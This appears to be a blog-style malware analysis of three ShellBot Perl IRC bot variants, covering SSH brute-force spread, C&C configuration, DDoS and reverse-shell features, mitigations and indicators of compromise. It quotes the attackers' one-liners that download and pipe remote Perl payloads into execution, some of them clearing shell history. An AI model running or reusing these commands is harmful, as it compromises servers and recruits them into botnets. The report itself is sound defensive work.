03/28/23

By: Enyel 

<h1>ShellBot's Attack Summary</h1>

Three malware variants were identified: LiGhT's modded Perlbot v2, DDoS PBot v2.0, and powerBoT (C) GohacK. Each malware variant poses a significant threat to affected systems and networks. This report provides a detailed analysis of each malware variant, including its behavior, technical details, and mitigation strategies.

There are three malware variants that have been identified in the systems, namely LiGhT's modded Perlbot v2, DDoS PBot v2.0, and powerBoT (C) GohacK. LiGhT's modded Perlbot v2 is a type of ShellBot malware that is being used by various threat actors. This malware targets servers with weak credentials and uses scanner malware to identify systems with an open SSH port 22. Once vulnerable servers are identified, the attackers use a list of known SSH credentials to initiate a dictionary attack to breach the server and deploy the payload. The payload then leverages the Internet Relay Chat (IRC) protocol to communicate with a remote server over IRP over TCP. This variant offers a variety of DDoS attack commands using HTTP, TCP, and UDP protocols, and a variety of commands that allows control over infected systems so that they can be used in other attacks such as reverse shell, log deletion, and scanner.


DDoS PBot v2.0 is another type of ShellBot malware that targets servers with weak credentials. Similar LiGhT's modded Perlbot v2, this variant uses scanner malware to identify systems with an open SSH port 22. The attackers then use a list of known SSH credentials to initiate a dictionary attack to breach the server and deploy the payload. The payload leverages the Internet Relay Chat (IRC) protocol to communicate with a remote server over IRP over TCP, similar to LiGhT's modded Perlbot v2. This variant offers a variety of DDoS attack commands using HTTP, TCP, and UDP protocols.

PowerBoT (C) GohacK is another variant of ShellBot malware. This malware comes with more backdoor-like capabilities to grant reverse shell access and upload arbitrary files from the compromised host. This variant allows attackers to gain complete control over the compromised system.

		 	 	 	
Mitigations:

To prevent such attacks, organizations must implement strong security practices, such as implementing strong password policies, using multi-factor authentication, regularly updating and patching systems, conducting regular network testing and vulnerability scanning, and implementing access control measures such as the principle of least privilege. It is also crucial to have a robust incident response plan in place to detect and respond to such attacks quickly. Additionally, organizations can protect themselves from 
DDoS attacks by implementing DDoS mitigation solutions, such as firewalls, intrusion prevention systems, and content delivery networks. 

Password changing helps networks prevent unauthorized access to network resources. As it makes it more difficult for attackers to guess or crack passwords. This is particularly important in the case of privileged accounts. Password change policies must be in place and follow accordingly. In the case of any breach or compromise of passwords changing it can help limit the damage that an attacker can do with the compromised credentials. 

To mitigate the risks of backdoors and C2 exploiting IRC servers, it is recommended to use strong passwords, limit access, monitor for suspicious activity, use secure connections such as SSL/TLS, implement access controls, regularly update software, and use antivirus and anti-malware software. By following these best practices, the risk of unauthorized access and exploitation of IRC servers can be reduced. It is important to review and update these practices regularly as new threats emerge. IRC servers are commonly used for real-time communication in chat rooms and private messaging, and for various purposes such as online gaming, tech support, socializing, online communities, and software development collaboration.

<img width="650" alt="Screen Shot 2023-06-01 at 12 57 32 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/ebcc7c47-1f5a-4ec8-8345-734582a657f5">

<img width="520" alt="Screen Shot 2023-06-01 at 12 59 33 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/2942a0bd-73aa-4c14-85e0-c8a9f6fe1fee">

<img width="532" alt="Screen Shot 2023-06-01 at 12 59 47 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/4ba16d6a-559b-401e-a5d4-6fc3078e241f">


Indicators of Compromise (IOC):

File Detection– Shellbot/Perl.Generic.S1100 (2020.02.12.00)– Shellbot/Perl.Generic.S1118 (2020.02.19.07)

IOCMD5– bef1a9a49e201095da0bb26642f65a78 : ak– 3eef28005943fee77f48ac6ba633740d : mperl– 55e5bfa75d72e9b579e59c00eaeb6922 : niko1– 6d2c754760ccd6e078de931f472c0f72 : perl– 7ca3f23f54e8c027a7e8b517995ae433 : bash– 2cf90bf5b61d605c116ce4715551b7a3 : test.jpg– 7bc4c22b0f34ef28b69d83a23a6c88c5 : dred– 176ebfc431daa903ef83e69934759212 : ff

Download URLs– x-x-x[.]online/ak– 193.233.202[.]219/mperl– 193.233.202[.]219/niko1– hxxp://34.225.57[.]146/futai/perl– 80.94.92[.]241/bash– hxxp://185.161.208[.]234/test.jpg– hxxp://39.165.53[.]17:8088/iposzz/dred– hxxp://80.68.196[.]6/ff

C&C URLs– 164.90.240[.]68:6667 : ak– 206.189.139[.]152:6667 : mperl– 176.123.2[.]3:6667 : niko1– 164.132.224[.]207:80 : perl– 51.195.42[.]59:8080 : bash– gsm.ftp[.]sh:1080 : test.jpg– 192.3.141[.]163:6667 : dred– 49.212.234[.]206:3303 : ff

Behavior similarities:
Rising MOVES
bad86cb7d09ab232edd2ddf8dddb1bb4
VirusTotal Box of Apples
1867e1cc695e361278f52100f36feb1e
Zenbox Linux
2dd457b43cdd9173e3e02ecb5a947d28

“LiGhT’s Modded perlbotv2” is being used by a variety of threat actors. The following commands are used in the ShellBot installation after the SSH server has been successfully logged into.

Filename: ak
Installation Command: wget -qO – x-x-x[.]online/ak|perl

Filename: perl
Installation Command: nproc; nvidia-smi –list-gpus ;cd /tmp;wget -qO – http://34.225[.]57.146/futai/perl|perl;rm -rf perl

Filename: mperl
Installation Command: cd /tmp ; wget 193.233.202[.]219/mperl ; perl mperl ; rm -rf mperl

Filename: niko2
Installation Command: cd /tmp ; wget 193.233.202[.]219/niko1 ; perl niko1 ; rm -rf niko1


Commands used to install LiGhT’s Modded perlbot v2:
Configuration data such as the C&C server and the name of the channel to join are included in the initial routine of ShellBot. A nickname with the format “IP-[5 random digits]” is used to join the IRC channels.

<img width="561" alt="Screen Shot 2023-06-01 at 1 05 53 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/236f9194-203e-440e-82a2-31cce4921ca7">

Configuration data for ShellBot:

Filename: ak
C&C URL: 164.90.240[.]68:6667
Channel Name: #nou
Filename: per

C&C URL: 164.132.224[.]207:80
Channel Name: #mailbomb
Filename: mperl

C&C URL: 206.189.139[.]152:6667
Channel Name: #Q
Filename: niko1

C&C URL: 176.123.2[.]3:6667
Channel Name: #X

C&C URL and channels of LiGhT’s Modded perlbot v2:
The “LiGhT’s Modded perlbot v2” version of ShellBot offers various features which are largely categorized in the table below. Commands that can actually be used for malicious purposes include DDoS commands such as TCP, UDP, and HTTP Flooding. It also includes a variety of commands that allows control over infected systems so that they can be used in other attacks such as reverse shell, log deletion, and scanner.

The available commands cover various categories. Under "flooding," there are commands specifically designed for IRC Flooding. The "irc" category consists of commands related to IRC control. For DDoS attacks, the "ddos" category offers a range of commands including TCP, UDP, HTTP, and SQL Flooding. If targeting security web pages is the objective, the "news" category provides DDoS attack commands tailored for that purpose. The "hacking" category offers a selection of attack commands such as MultiScan, Socks5, LogCleaner, Nmap, and Reverse Shell. In case of needing help, the "linuxhelp" category provides relevant assistance. There are also "extras" with additional features, presumably related to DDoS attacks. Lastly, the "version" command is available to obtain information about the system's current version.


3.2. DDoS PBot v2.0
Aside from “LiGhT’s Modded perlbot v2”, “DDoS PBot v2.0” is also being used in a variety of attacks. A characteristic of “DDoS PBot v2.0” is that it shows basic information and available commands in the annotations that can be seen during its initial routine.

<img width="784" alt="Screen Shot 2023-06-01 at 1 22 31 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/9ac4e293-e5e5-4f27-aab3-a7f30cf539cc">

Initial routine of DDoS PBot v2.0:
The following are commands used to install “DDoS PBot v2.0”.

Filename
Installation Command
bash
wget -qO – 80.94.92[.]241/bash|perl
test.jpg
uname -a;wget -q -O- hxxp://185.161.208[.]234/test.jpg|perl;curl -sS hxxp://185.161.208[.]234/test.jpg|perl;nproc;history -c
dred
uname -a;lspci | grep -i –color ‘vga|3d|2d’;curl -s -L hxxp://39.165.53[.]17:8088/iposzz/dred -o /tmp/dred;perl /tmp/dred


Commands used to install DDoS PBot v2.0:

“DDoS PBot v2.0” randomly chooses a nickname from a selection of over 500, which include “abbore”, “ably”, and “abyss”, before joining an IRC channel.

List of DDoS PBot v2.0 nicknames:
Filename
C&C URL
Channel Name
bash
51.195.42[.]59:8080
#sex
test.jpg
gsm.ftp[.]sh:1080
#test
dred
192.3.141[.]163:6667
#bigfalus

C&C URL and channels of DDoS PBot v2.0:
Additionally, regular IRC Bots receive commands from the threat actor via the IRC channels to perform malicious acts. Thus, there is a need to verify the threat actor sending commands. Without a verification process, any users can join the channel and control the bots however they want.

In order to do this, the IRC Bot has to perform an additional task where users that have joined the channel must verify their nickname and host address before they can enter a command. For example, in the case of the “bash” malware, the nickname must be either “crond,” “drugs,” or “tab” as defined in the “admins” variable, while the host address must be “localhost” as defined in the “hostauth” variable.

<img width="538" alt="Screen Shot 2023-06-01 at 1 28 54 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/6952c677-31ae-43ed-9a44-d5499aa798f7">

Configuration data of DDoS PBot v2.0
Like regular ShellBots, “DDoS PBot v2.0” also offers a variety of malicious commands including DDoS attack commands.

Command (Category)
Description
system
Infected, system information output
version,
Version information output,
channel
IRC control commands
flood,
DDoS commands,

TCP, UDP, HTTP, SQL Flooding,utils
Attack commands,

Port Scan, Reverse Shell, file download, etc.
Features supported by DDoS PBot v2.0

3.3. PowerBots (C) GohacK
The main characteristic of PowerBots is that it has a simpler form in comparison to the ShellBot types covered above.

Configuration data of PowerBots:

Filename:ff
Installation Command:

uname -a ;wget -qO – hxxp://80.68.196[.]6/ff|perl &>>/dev/null



Command used to install PowerBots:
Filename:ff

Channel Name:#x

C&C URL:49.212.234[.]206:3303


C&C URL and channel of DDoS PBot v2.0
ShellBot types usually offer a variety of DDoS attack features, but since PowerBots mainly focuses on its reverse shell and file downloading capabilities, it is likely that the threat actor installed ShellBot as a backdoor.

Command
Description




Command
Description



Command :ps
Description: Port scanning
Command:namp
Description: NMAP port scanning

NMAP port scanning
rm
Delete files in a particular path
version
Version information output
down
File download
udp
UDP Flooding attack
back
Reverse Shell


















